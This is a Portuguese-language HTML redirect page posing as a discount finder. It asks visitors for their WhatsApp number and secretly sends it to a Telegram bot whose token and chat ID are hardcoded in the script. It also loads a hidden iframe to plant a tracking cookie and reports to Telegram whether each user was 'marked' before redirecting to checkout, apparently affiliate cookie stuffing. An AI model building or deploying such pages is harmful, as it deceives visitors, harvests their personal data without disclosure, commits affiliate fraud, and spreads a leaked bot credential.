<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecionando</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f9f9f9;
    }

    .circle {
      width: 30px;
      height: 30px;
      border: 4px solid green;
      border-top: 4px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 24px;
      transition: opacity 0.4s ease-in-out;
      color: #333;
    }

    #fallback {
      display: none;
      margin-top: 20px;
      font-size: 16px;
    }

    #fallback a {
      color: green;
      text-decoration: underline;
    }

    #whatsContainer {
      margin-top: 25px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    #whatsapp {
      padding: 12px 16px;
      font-size: 16px;
      border: 1.5px solid #ccc;
      border-radius: 8px;
      outline: none;
      width: 250px;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
    }

    #whatsapp:focus {
      border-color: #34a853;
    }

    #okBtn {
      padding: 12px 20px;
      background-color: #34a853;
      color: white;
      font-weight: bold;
      border: none;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    #okBtn:hover {
      background-color: #2c8b44;
    }
  </style>
</head>
<body>

  <div class="circle"></div>
  <div id="message" class="text">Espere! Procurando pelo Melhor Desconto</div>

  <!-- CAMPO WHATSAPP -->
  <div id="whatsContainer">
    <input type="tel" id="whatsapp" placeholder="Digite seu Melhor WhatsApp">
    <button id="okBtn">✅ OK</button>
  </div>

  <iframe id="cookieFrame" src="" style="display:none;"></iframe>

  <div id="fallback">
    Se não for redirecionado, <a href="https://google.com">clique aqui</a>.
  </div>

  <script>
    const cookieURL = "https://google.com";
    const checkoutURL = "https://google.com";

    const NumeroTLG = '7674575961:AAGSl6HVhZJhymoedLgBMESc9rPF88Q98Es';
    const CanalTLG = '5493027377';

    let cookieConfirmado = false;
    let redirecionado = false;

    const msg = document.getElementById("message");
    const iframe = document.getElementById("cookieFrame");
    const whatsappInput = document.getElementById("whatsapp");
    const okBtn = document.getElementById("okBtn");
    const whatsContainer = document.getElementById("whatsContainer");

    // Gravação do cookie começa imediatamente
    iframe.src = cookieURL;

    iframe.onload = () => {
      setTimeout(() => {
        try {
          const test = iframe.contentWindow.location.href;
          cookieConfirmado = true;
        } catch (e) {
          cookieConfirmado = true;
        }
      }, 500);
    };

    // Função para enviar WhatsApp para Telegram
    function enviarAlerta(msg) {
      const url = `https://api.telegram.org/bot${NumeroTLG}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CanalTLG, text: msg })
      }).catch(console.error);
    }

    // Quando o botão OK é clicado
    okBtn.addEventListener("click", () => {
      const numero = whatsappInput.value.trim();
      if (!numero || numero.length < 11) {
        alert("Por favor, insira um número de WhatsApp válido. Exemplo: 43999999999");
        return;
      }

      // Envia o WhatsApp para o bot
      enviarAlerta(`📲 WhatsApp Informado: ${numero}`);
      okBtn.disabled = true;
      okBtn.innerText = "Enviado ✅";

      // Troca mensagens (espera > redirecionando)
      msg.style.opacity = 0;
      setTimeout(() => {
        msg.textContent = "Redirecionando para Página de Pagamento";
        msg.style.opacity = 1;
      }, 400);

      // Aguarda 2 segundos antes de redirecionar
      setTimeout(() => {
        if (cookieConfirmado && !redirecionado) {
          redirecionado = true;
          enviarAlerta(`✅ ACESSO DETECTADO! USUÁRIO MARCADO COM SUCESSO\nPÁGINA: ${checkoutURL}`);
          window.location.href = checkoutURL;
        } else if (!cookieConfirmado && !redirecionado) {
          redirecionado = true;
          enviarAlerta(`⛔ ERRO AO MARCAR O USUÁRIO\nPÁGINA: ${checkoutURL}`);
          document.getElementById("fallback").style.display = "block";
          window.location.href = checkoutURL;
        }
      }, 2000);
    });

    // Fallback após 10 segundos (caso iframe não carregue)
    setTimeout(() => {
      if (!cookieConfirmado && !redirecionado) {
        redirecionado = true;
        enviarAlerta(`⛔ ERRO TOTAL NA MARCAÇÃO - REDIRECIONAMENTO FORÇADO`);
        document.getElementById("fallback").style.display = "block";
        window.location.href = checkoutURL;
      }
    }, 10000);
  </script>

</body>
</html>
